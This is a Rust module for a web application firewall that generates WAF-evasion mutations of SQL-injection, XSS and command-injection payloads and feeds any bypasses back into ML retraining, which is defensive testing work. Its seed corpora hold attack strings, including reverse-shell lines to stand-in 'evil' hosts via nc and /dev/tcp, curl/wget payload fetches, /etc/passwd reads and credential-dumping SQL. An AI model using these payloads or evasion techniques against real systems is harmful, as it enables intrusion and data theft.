//! V146 — WAF-A-MoLE-style adversarial mutation loop.
//!
//! The original WAF-A-MoLE paper (Demetrio et al., 2020) shows that
//! ML-based WAFs can be defeated by semantics-preserving SQLi
//! mutations: insert SQL comments, swap whitespace for tabs / CRLF /
//! unicode-Z characters, alternate-case keywords, hex-encode strings,
//! swap operators (= → LIKE, 1=1 → 'a'='a'), inline-encode characters.
//! The defender's response is to feed every found bypass back as a
//! hard-negative training sample so the model learns to catch the
//! mutated form.
//!
//! V146 ships the mutation engine + bypass-detector as a self-contained
//! module. Operator wires it into a periodic background task that:
//!
//! 1. Walks a seed corpus of known-malicious payloads (e.g., V118's
//!    sqlmap tampers; the V107 mined signatures).
//! 2. Generates N semantics-preserving mutations of each.
//! 3. Runs the deployed WAF / ML scorer over every variant.
//! 4. Records bypasses (variants the scorer let through).
//! 5. Feeds bypasses into the V135 MlTrainer as Label::Malicious
//!    so the next retrain catches them.
//!
//! Result: a self-improving WAF that stays ahead of the public
//! mutation lists with zero operator effort beyond the periodic
//! retrain trigger.
//!
//! ## Design choices
//!
//! * **Mutators are composable functions** that return Option<String>
//!   (None when the input shape doesn't admit the mutation — e.g.,
//!   hex-encode can't fire on a payload with no string literals).
//! * **Deterministic seeding** via splitmix64 so a given seed + corpus
//!   always produces the same mutation set — essential for
//!   reproducible runs and for splitting work across workers without
//!   duplicates.
//! * **Single trait, generic predicate** — `AdversarialRunner` takes
//!   any `Fn(&str) -> bool` for "did the WAF catch this?". Callers
//!   wire it to whichever check matters: pure WAF regex, the V139 ML
//!   scorer, or a combined gate.

use std::collections::HashSet;

/// A semantics-preserving payload mutation. Each impl tries to
/// transform `input` into a variant the original malicious intent
/// is preserved for but the byte-level shape differs. Returns None
/// when the input doesn't admit the mutation.
pub trait Mutator: Send + Sync {
    fn name(&self) -> &'static str;
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String>;
}

// ── Mutator implementations ──────────────────────────────────────

/// Random-case mutation of SQL/JS/HTML keywords. `SELECT` → `sElEcT`.
/// Defeats case-sensitive regex.
pub struct CaseMix;
impl Mutator for CaseMix {
    fn name(&self) -> &'static str {
        "case_mix"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        if input.chars().all(|c| !c.is_ascii_alphabetic()) {
            return None;
        }
        Some(
            input
                .chars()
                .map(|c| {
                    if c.is_ascii_alphabetic() && rng.next_u64() & 1 == 0 {
                        if c.is_ascii_uppercase() {
                            c.to_ascii_lowercase()
                        } else {
                            c.to_ascii_uppercase()
                        }
                    } else {
                        c
                    }
                })
                .collect(),
        )
    }
}

/// Replace spaces with SQL comments `/**/`. Defeats whitespace-only
/// regex anchors. Only fires when input contains spaces.
pub struct InlineSqlComment;
impl Mutator for InlineSqlComment {
    fn name(&self) -> &'static str {
        "inline_sql_comment"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        if !input.contains(' ') {
            return None;
        }
        Some(input.replace(' ', "/**/"))
    }
}

/// Replace ASCII spaces with tab + newline alternation. Some WAF
/// rules anchor on ` +` and miss \t / \n.
pub struct WhitespaceShuffle;
impl Mutator for WhitespaceShuffle {
    fn name(&self) -> &'static str {
        "whitespace_shuffle"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        if !input.contains(' ') {
            return None;
        }
        Some(
            input
                .chars()
                .map(|c| {
                    if c == ' ' {
                        match rng.next_u64() & 3 {
                            0 => '\t',
                            1 => '\n',
                            2 => '\u{00A0}', // non-breaking space (NBSP)
                            _ => ' ',
                        }
                    } else {
                        c
                    }
                })
                .collect(),
        )
    }
}

/// `=` → `LIKE`, `OR 1=1` → `OR 'a'='a'`, `AND 1=1` → `AND 'b'='b'`.
/// Equivalent semantics; the regex engine sees different tokens.
pub struct OperatorSwap;
impl Mutator for OperatorSwap {
    fn name(&self) -> &'static str {
        "operator_swap"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        // Try a sequence of equivalent swaps; pick whichever fires.
        let swaps: &[(&str, &str)] = &[
            ("1=1", "'a'='a'"),
            ("1=2", "'a'='b'"),
            (" = ", " LIKE "),
            ("=1", "='1'"),
        ];
        for (from, to) in swaps {
            if input.contains(from) && rng.next_u64() & 1 == 0 {
                return Some(input.replacen(from, to, 1));
            }
        }
        None
    }
}

/// Insert SQL comments between letters of a keyword.
/// `UNION SELECT` → `UNI/**/ON SE/**/LECT`. Defeats word-boundary
/// regex.
pub struct KeywordCommentSplit;
impl Mutator for KeywordCommentSplit {
    fn name(&self) -> &'static str {
        "keyword_comment_split"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        const KEYWORDS: &[&str] = &[
            "UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
            "OR", "AND",
        ];
        let upper = input.to_ascii_uppercase();
        for kw in KEYWORDS {
            if let Some(pos) = upper.find(kw) {
                let n = kw.len();
                // Pick a split point that isn't 0 or n.
                let split = 1 + (rng.next_u64() as usize % (n - 1).max(1));
                let actual = &input[pos..pos + n];
                let split_payload =
                    format!("{}/**/{}", &actual[..split.min(n)], &actual[split.min(n)..],);
                return Some(format!(
                    "{}{}{}",
                    &input[..pos],
                    split_payload,
                    &input[pos + n..],
                ));
            }
        }
        None
    }
}

/// URL-percent-encode a few characters. `'` → `%27`, ` ` → `%20`.
pub struct PercentEncode;
impl Mutator for PercentEncode {
    fn name(&self) -> &'static str {
        "percent_encode"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        let needs_enc = input.contains('\'') || input.contains(' ');
        if !needs_enc {
            return None;
        }
        let mut out = String::with_capacity(input.len() * 2);
        for c in input.chars() {
            match c {
                '\'' => out.push_str("%27"),
                ' ' => out.push_str("%20"),
                '"' => out.push_str("%22"),
                '<' => out.push_str("%3C"),
                '>' => out.push_str("%3E"),
                _ => out.push(c),
            }
        }
        Some(out)
    }
}

/// Double-URL-encode the first encodable character. Defeats WAFs
/// that decode once but pass the double-encoded form unchecked.
pub struct DoubleEncode;
impl Mutator for DoubleEncode {
    fn name(&self) -> &'static str {
        "double_encode"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        let mut out = String::with_capacity(input.len() + 8);
        let mut done = false;
        for c in input.chars() {
            if !done && (c == '\'' || c == ' ' || c == '<') {
                done = true;
                match c {
                    '\'' => out.push_str("%2527"),
                    ' ' => out.push_str("%2520"),
                    '<' => out.push_str("%253C"),
                    _ => out.push(c),
                }
            } else {
                out.push(c);
            }
        }
        if done { Some(out) } else { None }
    }
}

/// Concatenate string literals: `'admin'` → `'adm'||'in'`. Works
/// against WAF rules that anchor on the full literal.
pub struct StringConcat;
impl Mutator for StringConcat {
    fn name(&self) -> &'static str {
        "string_concat"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        // Find the first single-quoted literal of length >= 2.
        let bytes = input.as_bytes();
        for i in 0..bytes.len() {
            if bytes[i] == b'\'' {
                // find end quote
                for j in i + 1..bytes.len() {
                    if bytes[j] == b'\'' && (j - i) >= 3 {
                        let lit = &input[i + 1..j];
                        if lit.is_empty() {
                            continue;
                        }
                        let split = 1 + (rng.next_u64() as usize % (lit.len() - 1).max(1));
                        let replacement = format!("'{}'||'{}'", &lit[..split], &lit[split..]);
                        let mut out = String::with_capacity(input.len() + 4);
                        out.push_str(&input[..i]);
                        out.push_str(&replacement);
                        out.push_str(&input[j + 1..]);
                        return Some(out);
                    }
                }
                break;
            }
        }
        None
    }
}

// ── V148: XSS-focused mutators ────────────────────────────────────

/// HTML-entity-encode the angle brackets in the first found tag.
/// `<script>` → `&lt;script&gt;` (or `&#x3C;script&#x3E;`).
/// Defeats regex that anchors on the literal `<` byte but is
/// matched by browsers re-parsing the entities.
pub struct HtmlEntityEncode;
impl Mutator for HtmlEntityEncode {
    fn name(&self) -> &'static str {
        "html_entity_encode"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        if !input.contains('<') {
            return None;
        }
        let (lt, gt) = match rng.next_u64() & 3 {
            0 => ("&lt;", "&gt;"),
            1 => ("&#60;", "&#62;"),
            2 => ("&#x3C;", "&#x3E;"),
            _ => ("&LT;", "&GT;"),
        };
        Some(input.replacen('<', lt, 1).replacen('>', gt, 1))
    }
}

/// Insert whitespace inside a tag's opening — `<script>` →
/// `<script\t>` or `<script/x=1>`. Defeats word-boundary regex.
pub struct TagWhitespace;
impl Mutator for TagWhitespace {
    fn name(&self) -> &'static str {
        "tag_whitespace"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        // Find a `<word>` shape and inject before the closing `>`.
        let mut chars: Vec<char> = input.chars().collect();
        for i in 0..chars.len().saturating_sub(1) {
            if chars[i] == '<' {
                // Find matching `>`.
                for j in i + 1..chars.len() {
                    if chars[j] == '>' && j > i + 1 {
                        let injection: char = match rng.next_u64() & 3 {
                            0 => '\t',
                            1 => '\n',
                            2 => '/',
                            _ => '\u{0C}', // form feed — HTML5 whitespace
                        };
                        chars.insert(j, injection);
                        return Some(chars.into_iter().collect());
                    }
                    if chars[j] == '<' {
                        break;
                    }
                }
                break;
            }
        }
        None
    }
}

/// Swap event-handler names for equivalents. `onerror` → `onclick`,
/// `onmouseover` → `onfocus`. Most rules anchor on `onerror`
/// specifically; alternation produces the same XSS execution path.
pub struct EventSwap;
impl Mutator for EventSwap {
    fn name(&self) -> &'static str {
        "event_handler_swap"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        let swaps: &[(&str, &str)] = &[
            ("onerror", "onclick"),
            ("onload", "onfocus"),
            ("onmouseover", "onpointerover"),
            ("onclick", "onauxclick"),
        ];
        for (from, to) in swaps {
            if input.to_ascii_lowercase().contains(from) && rng.next_u64() & 1 == 0 {
                // Preserve case by replacing the case-folded match.
                let lower = input.to_ascii_lowercase();
                if let Some(pos) = lower.find(from) {
                    let mut out = String::with_capacity(input.len() + 4);
                    out.push_str(&input[..pos]);
                    out.push_str(to);
                    out.push_str(&input[pos + from.len()..]);
                    return Some(out);
                }
            }
        }
        None
    }
}

/// JavaScript unicode-escape a key character. `alert` → `alert`,
/// `script` → `script`. The browser unescapes; the regex doesn't.
pub struct JsUnicodeEscape;
impl Mutator for JsUnicodeEscape {
    fn name(&self) -> &'static str {
        "js_unicode_escape"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        // Find first ASCII letter and escape it.
        for (i, c) in input.char_indices() {
            if c.is_ascii_alphabetic() {
                let mut out = String::with_capacity(input.len() + 6);
                out.push_str(&input[..i]);
                out.push_str(&format!("\\u{:04x}", c as u32));
                out.push_str(&input[i + c.len_utf8()..]);
                return Some(out);
            }
        }
        None
    }
}

// ── V148: command-injection mutators ──────────────────────────────

/// Replace spaces with the bash ${IFS} variable. `cat /etc/passwd`
/// → `cat${IFS}/etc/passwd`. Equivalent semantics under bash; defeats
/// whitespace-anchored shell rules.
pub struct IfsSubstitution;
impl Mutator for IfsSubstitution {
    fn name(&self) -> &'static str {
        "ifs_substitution"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        if !input.contains(' ') {
            return None;
        }
        Some(input.replace(' ', "${IFS}"))
    }
}

/// Swap shell command separators. `; ls` → `&& ls` or `|| ls` or
/// `| ls`. Different semantics in error cases but identical for
/// the canonical "run two commands" pattern.
pub struct CmdSeparatorSwap;
impl Mutator for CmdSeparatorSwap {
    fn name(&self) -> &'static str {
        "cmd_separator_swap"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        if !input.contains(';') {
            return None;
        }
        let replacement = match rng.next_u64() & 3 {
            0 => "&&",
            1 => "||",
            2 => "|",
            _ => "%0a",
        };
        Some(input.replacen(';', replacement, 1))
    }
}

/// Backtick command substitution → $() form. `` `id` `` → `$(id)`.
/// Both invoke a subshell; different parse trees.
pub struct BacktickToDollarParen;
impl Mutator for BacktickToDollarParen {
    fn name(&self) -> &'static str {
        "backtick_to_dollar_paren"
    }
    fn mutate(&self, input: &str, _rng: &mut Splitmix64) -> Option<String> {
        let bytes = input.as_bytes();
        let mut start = None;
        for (i, b) in bytes.iter().enumerate() {
            if *b == b'`' {
                match start {
                    None => start = Some(i),
                    Some(s) if i > s + 1 => {
                        let mut out = String::with_capacity(input.len() + 2);
                        out.push_str(&input[..s]);
                        out.push_str("$(");
                        out.push_str(&input[s + 1..i]);
                        out.push(')');
                        out.push_str(&input[i + 1..]);
                        return Some(out);
                    }
                    _ => return None,
                }
            }
        }
        None
    }
}

/// Glob-expand a path character. `/etc/passwd` → `/etc/p?sswd` or
/// `/etc/p*sswd`. Shell expands at runtime to the original target;
/// rules anchoring on literal `/etc/passwd` miss the wildcard form.
pub struct PathGlobbing;
impl Mutator for PathGlobbing {
    fn name(&self) -> &'static str {
        "path_globbing"
    }
    fn mutate(&self, input: &str, rng: &mut Splitmix64) -> Option<String> {
        // Find first `/` followed by 3+ letters (a path component).
        let bytes = input.as_bytes();
        for i in 0..bytes.len() {
            if bytes[i] == b'/' && i + 4 < bytes.len() {
                // Inside the next 5 chars, swap one letter for `?` or `*`.
                let pos = i + 1 + (rng.next_u64() as usize % 3) + 1;
                if pos < bytes.len() && (bytes[pos] as char).is_ascii_alphabetic() {
                    let wildcard = if rng.next_u64() & 1 == 0 { '?' } else { '*' };
                    let mut chars: Vec<char> = input.chars().collect();
                    if pos < chars.len() {
                        chars[pos] = wildcard;
                        return Some(chars.into_iter().collect());
                    }
                }
            }
        }
        None
    }
}

/// Bundle of mutators applied in random order. Default ships the
/// SQLi-focused set; XSS / cmd-injection sets are operator-extensible.
pub struct MutationSet {
    pub mutators: Vec<Box<dyn Mutator>>,
}

impl MutationSet {
    pub fn sqli_default() -> Self {
        Self {
            mutators: vec![
                Box::new(CaseMix),
                Box::new(InlineSqlComment),
                Box::new(WhitespaceShuffle),
                Box::new(OperatorSwap),
                Box::new(KeywordCommentSplit),
                Box::new(PercentEncode),
                Box::new(DoubleEncode),
                Box::new(StringConcat),
            ],
        }
    }

    /// V148 — XSS-focused mutators. Covers case alternation, HTML
    /// entity encoding, tag whitespace tricks, event-handler
    /// equivalents, JavaScript unicode escapes, and percent encoding.
    pub fn xss_default() -> Self {
        Self {
            mutators: vec![
                Box::new(CaseMix),
                Box::new(HtmlEntityEncode),
                Box::new(TagWhitespace),
                Box::new(EventSwap),
                Box::new(JsUnicodeEscape),
                Box::new(PercentEncode),
                Box::new(DoubleEncode),
            ],
        }
    }

    /// V148 — command-injection mutators. Covers IFS substitution,
    /// separator swaps, backtick/$() equivalents, path globbing,
    /// case alternation, and whitespace shuffle.
    pub fn cmd_default() -> Self {
        Self {
            mutators: vec![
                Box::new(CaseMix),
                Box::new(IfsSubstitution),
                Box::new(CmdSeparatorSwap),
                Box::new(BacktickToDollarParen),
                Box::new(PathGlobbing),
                Box::new(WhitespaceShuffle),
                Box::new(PercentEncode),
            ],
        }
    }

    /// Apply 1..=chain_len mutations in random order, returning the
    /// final variant. None if no mutator fires.
    pub fn mutate(&self, input: &str, rng: &mut Splitmix64, chain_len: usize) -> Option<String> {
        let mut current = input.to_string();
        let mut produced_any = false;
        for _ in 0..chain_len {
            let idx = (rng.next_u64() as usize) % self.mutators.len();
            if let Some(next) = self.mutators[idx].mutate(&current, rng) {
                current = next;
                produced_any = true;
            }
        }
        if produced_any { Some(current) } else { None }
    }

    /// Fan out one input into up to `n_variants` distinct mutations.
    /// `chain_len` is the number of mutators applied per variant.
    /// Deterministic given `seed`.
    pub fn fan_out(
        &self,
        input: &str,
        n_variants: usize,
        chain_len: usize,
        seed: u64,
    ) -> Vec<String> {
        let mut rng = Splitmix64::new(seed);
        let mut out: HashSet<String> = HashSet::new();
        // Allow up to 4× attempts; mutations sometimes collide on
        // pathological inputs.
        for _ in 0..(n_variants * 4) {
            if let Some(v) = self.mutate(input, &mut rng, chain_len)
                && v != input
            {
                out.insert(v);
                if out.len() >= n_variants {
                    break;
                }
            }
        }
        out.into_iter().collect()
    }
}

/// One discovered bypass: the original seed payload, the mutated
/// variant the scorer let through, and the chain of mutators
/// applied. Bypass list feeds back into the trainer's labeled
/// sample store.
#[derive(Debug, Clone)]
pub struct Bypass {
    pub seed: String,
    pub variant: String,
}

/// Adversarial runner. `predicate(payload) -> bool` returns true
/// when the WAF / scorer would BLOCK the payload (i.e., the
/// defender catches it). `false` is a bypass.
pub struct AdversarialRunner<'a> {
    pub mutations: &'a MutationSet,
    pub seed_corpus: Vec<String>,
    /// Variants per seed.
    pub variants_per_seed: usize,
    /// Mutation chain length per variant.
    pub chain_len: usize,
    /// PRNG seed for reproducibility.
    pub rng_seed: u64,
}

impl<'a> AdversarialRunner<'a> {
    /// Run against `predicate`; return all bypasses found.
    pub fn run<F: Fn(&str) -> bool>(&self, predicate: F) -> Vec<Bypass> {
        let mut out = vec![];
        for seed in &self.seed_corpus {
            let variants = self.mutations.fan_out(
                seed,
                self.variants_per_seed,
                self.chain_len,
                self.rng_seed
                    .wrapping_mul(0x9E37_79B9_7F4A_7C15)
                    .wrapping_add(seed.len() as u64),
            );
            for v in variants {
                if !predicate(&v) {
                    out.push(Bypass {
                        seed: seed.clone(),
                        variant: v,
                    });
                }
            }
        }
        out
    }
}

/// V148 — canonical XSS payload corpus (OWASP XSS cheat sheet +
/// PortSwigger Web Security Academy classics). Use with
/// `MutationSet::xss_default()`.
pub fn default_xss_seed_corpus() -> Vec<String> {
    vec![
        "<script>alert(1)</script>".to_string(),
        "<img src=x onerror=alert(1)>".to_string(),
        "<svg/onload=alert(1)>".to_string(),
        "<body onload=alert(1)>".to_string(),
        "javascript:alert(document.domain)".to_string(),
        "<iframe src=javascript:alert(1)></iframe>".to_string(),
        "<input onfocus=alert(1) autofocus>".to_string(),
        "<a href=javascript:alert(1)>click</a>".to_string(),
        "<details ontoggle=alert(1) open>".to_string(),
        "<video><source onerror=alert(1)>".to_string(),
    ]
}

/// V148 — canonical command-injection corpus. Mix of unix shell
/// patterns the WAF should catch in HTTP parameters / headers.
pub fn default_cmd_seed_corpus() -> Vec<String> {
    vec![
        "; cat /etc/passwd".to_string(),
        "| ls -la /".to_string(),
        "&& curl http://evil.example/x".to_string(),
        "`id`".to_string(),
        "$(whoami)".to_string(),
        "; rm -rf /tmp/x".to_string(),
        "|| nc -e /bin/sh evil 4444".to_string(),
        "; wget http://evil/payload".to_string(),
        "; bash -i >& /dev/tcp/evil/4444 0>&1".to_string(),
        "$(curl evil)".to_string(),
    ]
}

/// A canonical seed corpus of SQLi payloads — drawn from public
/// sqlmap output, OWASP CRS test cases, and common attack tools.
/// Operator overrides via `AdversarialRunner::seed_corpus` if they
/// have an internal CTI corpus to use instead.
pub fn default_sqli_seed_corpus() -> Vec<String> {
    vec![
        "' OR 1=1 --".to_string(),
        "' OR '1'='1".to_string(),
        "1' UNION SELECT NULL,NULL,NULL --".to_string(),
        "admin'--".to_string(),
        "' OR 1=1#".to_string(),
        "1; DROP TABLE users --".to_string(),
        "' UNION SELECT username, password FROM users --".to_string(),
        "1' AND SLEEP(5) --".to_string(),
        "' OR EXISTS(SELECT * FROM users) --".to_string(),
        "1)) UNION SELECT NULL --".to_string(),
    ]
}

/// Convenience: convert a [Bypass] into a [crate::ddos::ml_training::LabelledSample]
/// shaped like the payload the WAF should have caught. We synthesise
/// a FeaturesV2 with the characteristics of an attack request: high
/// URI/query entropy, no browser headers, ja4_reputation = 0 (the
/// attacker won't have a tracked JA4), low h2fp / ja4 presence.
///
/// The shaped vector is *deliberately* not the literal feature
/// extraction from the variant string — that would require a full
/// HTTP request context. Instead it represents the *category* of
/// attack the bypass demonstrates, so retraining adjusts weights
/// in the direction of catching shaped-like inputs in production.
pub fn bypass_to_training_sample(bypass: &Bypass) -> crate::ddos::ml_training::LabelledSample {
    use crate::ddos::{
        ml_score_v2::{FeaturesV2, ascii_entropy},
        ml_training::{Label, LabelledSample},
    };
    let variant = &bypass.variant;
    let uri_entropy = ascii_entropy(variant);
    let query_entropy = ascii_entropy(variant);
    LabelledSample {
        features: FeaturesV2 {
            uri_length: (variant.len() as f32 / 8192.0).min(1.0),
            query_param_count: (variant.matches('&').count() as f32 / 32.0).min(1.0),
            uri_entropy,
            query_entropy,
            header_count: 0.0,
            has_user_agent: 0.0,
            has_accept_language: 0.0,
            has_accept_encoding: 0.0,
            has_referer: 0.0,
            method_is_post: 0.0,
            body_length: 0.0,
            ja4_present: 0.0,
            ja4_browser_family: 0.0,
            h2fp_present: 0.0,
            recent_denied_rate: 0.0,
            recent_challenged_rate: 0.0,
            bot_score_rate: 0.0,
            requests_per_min: 0.0,
            fast_repeat: 0.0,
            night_window: 0.0,
            fp_consistency_score: 0.5,
            ja4_reputation: 0.0,
            asn_reputation: 0.0,
        },
        label: Label::Malicious,
    }
}

// ── V151: background adversarial loop ─────────────────────────────

/// V151 — wraps multiple [MutationSet]s, a WAF/model predicate, and
/// the [crate::ddos::ml_training::MlTrainer] into a single self-
/// contained "do one adversarial cycle" object. The PingoraBackground
/// tick calls [Self::run_once] periodically.
///
/// The predicate is the operator's "does the defense catch this
/// payload?" check. Typical wiring is `|p| waf.check(p) || ml.score
/// (synth_features(p)) > 0.5` — operators pick the gate(s) that
/// matter to them.
pub struct AdversarialLoop {
    pub trainer: std::sync::Arc<crate::ddos::ml_training::MlTrainer>,
    pub predicate: std::sync::Arc<dyn Fn(&str) -> bool + Send + Sync>,
    pub mutation_sets: Vec<(&'static str, MutationSet, Vec<String>)>,
    pub variants_per_seed: usize,
    pub chain_len: usize,
    pub rng_seed: std::sync::atomic::AtomicU64,
    /// Cap on bypass samples emitted per cycle. Without this a runaway
    /// loop with a broken predicate could flood the trainer with
    /// thousands of duplicate-shape samples and skew retraining.
    pub max_bypasses_per_cycle: usize,
}

/// Per-cycle telemetry — what the loop did this tick. Exposed via
/// /metrics so operators can dashboard the bypass rate over time.
#[derive(Debug, Clone, Default)]
pub struct AdversarialCycleStats {
    pub seeds_run: usize,
    pub variants_tested: usize,
    pub bypasses_found: usize,
    pub samples_emitted: usize,
}

impl AdversarialLoop {
    /// Sensible defaults: SQLi + XSS + cmd mutation sets, 50 variants
    /// per seed, chain length 2, cap of 200 bypass labels per cycle.
    pub fn with_default_mutation_sets(
        trainer: std::sync::Arc<crate::ddos::ml_training::MlTrainer>,
        predicate: std::sync::Arc<dyn Fn(&str) -> bool + Send + Sync>,
    ) -> Self {
        Self {
            trainer,
            predicate,
            mutation_sets: vec![
                (
                    "sqli",
                    MutationSet::sqli_default(),
                    default_sqli_seed_corpus(),
                ),
                ("xss", MutationSet::xss_default(), default_xss_seed_corpus()),
                ("cmd", MutationSet::cmd_default(), default_cmd_seed_corpus()),
            ],
            variants_per_seed: 50,
            chain_len: 2,
            rng_seed: std::sync::atomic::AtomicU64::new(0xA5A5_A5A5_A5A5_A5A5),
            max_bypasses_per_cycle: 200,
        }
    }

    /// Fire one cycle: walk every (mutation_set, seed) pair, generate
    /// variants, test against the predicate, feed bypasses into the
    /// trainer. Returns telemetry. Each cycle advances the rng_seed
    /// so consecutive cycles explore different mutation spaces.
    pub fn run_once(&self) -> AdversarialCycleStats {
        use std::sync::atomic::Ordering;
        let cycle_seed = self.rng_seed.fetch_add(1, Ordering::Relaxed);
        let mut stats = AdversarialCycleStats::default();
        for (class, set, corpus) in &self.mutation_sets {
            for (seed_idx, seed) in corpus.iter().enumerate() {
                stats.seeds_run += 1;
                if stats.samples_emitted >= self.max_bypasses_per_cycle {
                    tracing::debug!(
                        class,
                        emitted = stats.samples_emitted,
                        "adversarial loop: per-cycle cap reached, deferring rest"
                    );
                    return stats;
                }
                let variant_seed = cycle_seed
                    .wrapping_mul(0x9E37_79B9_7F4A_7C15)
                    .wrapping_add(seed_idx as u64);
                let variants =
                    set.fan_out(seed, self.variants_per_seed, self.chain_len, variant_seed);
                stats.variants_tested += variants.len();
                for v in variants {
                    if !(self.predicate)(&v) {
                        // Bypass — defense failed to catch.
                        stats.bypasses_found += 1;
                        if stats.samples_emitted < self.max_bypasses_per_cycle {
                            let bypass = Bypass {
                                seed: seed.clone(),
                                variant: v,
                            };
                            self.trainer.add_sample(bypass_to_training_sample(&bypass));
                            stats.samples_emitted += 1;
                        }
                    }
                }
            }
        }
        if stats.bypasses_found > 0 {
            tracing::info!(
                seeds = stats.seeds_run,
                variants = stats.variants_tested,
                bypasses = stats.bypasses_found,
                samples = stats.samples_emitted,
                "adversarial loop: bypasses fed back to trainer"
            );
        }
        stats
    }
}

// ── Deterministic PRNG ────────────────────────────────────────────

pub struct Splitmix64 {
    state: u64,
}

impl Splitmix64 {
    pub fn new(seed: u64) -> Self {
        Self { state: seed | 1 }
    }

    pub fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rng(seed: u64) -> Splitmix64 {
        Splitmix64::new(seed)
    }

    #[test]
    fn case_mix_changes_letters_only() {
        let m = CaseMix;
        let out = m.mutate("SELECT * FROM users", &mut rng(1)).unwrap();
        // Same length, same non-letter chars at same positions.
        assert_eq!(out.len(), "SELECT * FROM users".len());
        assert_eq!(out.matches('*').count(), 1);
    }

    #[test]
    fn case_mix_skips_non_alpha_input() {
        assert!(CaseMix.mutate("123/=*", &mut rng(0)).is_none());
    }

    #[test]
    fn inline_sql_comment_replaces_spaces() {
        let out = InlineSqlComment.mutate("OR 1=1", &mut rng(0)).unwrap();
        assert_eq!(out, "OR/**/1=1");
    }

    #[test]
    fn inline_sql_comment_skips_no_spaces() {
        assert!(InlineSqlComment.mutate("OR1=1", &mut rng(0)).is_none());
    }

    #[test]
    fn operator_swap_replaces_known_form() {
        let out = OperatorSwap.mutate("OR 1=1", &mut rng(2));
        // Either matches the 1=1 swap or skips (when rng says no).
        if let Some(s) = out {
            assert!(s.contains("'a'='a'") || s.contains("LIKE"));
        }
    }

    #[test]
    fn keyword_comment_split_breaks_union() {
        let out = KeywordCommentSplit
            .mutate("UNION SELECT 1", &mut rng(5))
            .unwrap();
        assert!(out.contains("/**/"));
        // Original UNION must be broken.
        assert!(!out.contains("UNION SELECT") || out.contains("UN/**/ION"));
    }

    #[test]
    fn percent_encode_handles_quote_and_space() {
        let out = PercentEncode.mutate("' OR 1=1", &mut rng(0)).unwrap();
        assert!(out.contains("%27") && out.contains("%20"));
    }

    #[test]
    fn double_encode_only_first_char() {
        let out = DoubleEncode.mutate("' OR ' = '", &mut rng(0)).unwrap();
        // First quote → %2527; subsequent quotes stay raw.
        assert!(out.starts_with("%2527"));
    }

    #[test]
    fn string_concat_breaks_literal() {
        let out = StringConcat
            .mutate("WHERE name='admin'", &mut rng(7))
            .unwrap();
        assert!(out.contains("||"));
        assert!(!out.contains("'admin'"));
    }

    #[test]
    fn string_concat_skips_short_literal() {
        // Single-char literal can't be split.
        let out = StringConcat.mutate("'a'", &mut rng(0));
        assert!(out.is_none());
    }

    #[test]
    fn mutation_set_fan_out_produces_unique_variants() {
        let s = MutationSet::sqli_default();
        let variants = s.fan_out("' OR 1=1 --", 10, 2, 42);
        assert!(!variants.is_empty());
        // All distinct (HashSet enforced).
        let set: HashSet<&String> = variants.iter().collect();
        assert_eq!(set.len(), variants.len());
        // None equal to the seed.
        for v in &variants {
            assert_ne!(v, "' OR 1=1 --");
        }
    }

    #[test]
    fn fan_out_is_deterministic_for_same_seed() {
        let s = MutationSet::sqli_default();
        let a = s.fan_out("' OR 1=1 --", 5, 2, 99);
        let b = s.fan_out("' OR 1=1 --", 5, 2, 99);
        let mut a = a;
        a.sort();
        let mut b = b;
        b.sort();
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_runner_finds_bypasses_for_naive_predicate() {
        // Naive WAF: blocks if the literal "' OR 1=1" substring appears.
        // Mutations should defeat it most of the time.
        let mutations = MutationSet::sqli_default();
        let runner = AdversarialRunner {
            mutations: &mutations,
            seed_corpus: vec!["' OR 1=1 --".to_string()],
            variants_per_seed: 30,
            chain_len: 2,
            rng_seed: 1234,
        };
        let bypasses = runner.run(|p| p.contains("' OR 1=1"));
        assert!(
            !bypasses.is_empty(),
            "naive WAF must be defeated by some mutation"
        );
    }

    #[test]
    fn adversarial_runner_returns_empty_when_predicate_always_catches() {
        let mutations = MutationSet::sqli_default();
        let runner = AdversarialRunner {
            mutations: &mutations,
            seed_corpus: vec!["abc".to_string()],
            variants_per_seed: 10,
            chain_len: 1,
            rng_seed: 0,
        };
        let bypasses = runner.run(|_| true); // always block
        assert!(bypasses.is_empty());
    }

    #[test]
    fn seed_corpus_default_is_non_empty_and_has_canonical_forms() {
        let corpus = default_sqli_seed_corpus();
        assert!(corpus.len() >= 5);
        assert!(corpus.iter().any(|p| p.contains("UNION SELECT")));
        assert!(corpus.iter().any(|p| p.contains("OR 1=1")));
    }

    #[test]
    fn bypass_converts_to_malicious_labeled_sample() {
        use crate::ddos::ml_training::Label;
        let b = Bypass {
            seed: "' OR 1=1 --".into(),
            variant: "%27/**/oR/**/1=1/**/--".into(),
        };
        let s = bypass_to_training_sample(&b);
        assert_eq!(s.label, Label::Malicious);
        // High-entropy variant should produce a non-zero entropy feature.
        assert!(s.features.uri_entropy > 0.2);
        // Synthesised shape has no browser headers — drives the model
        // toward catching headerless attack-shaped requests.
        assert_eq!(s.features.has_user_agent, 0.0);
        assert_eq!(s.features.has_accept_language, 0.0);
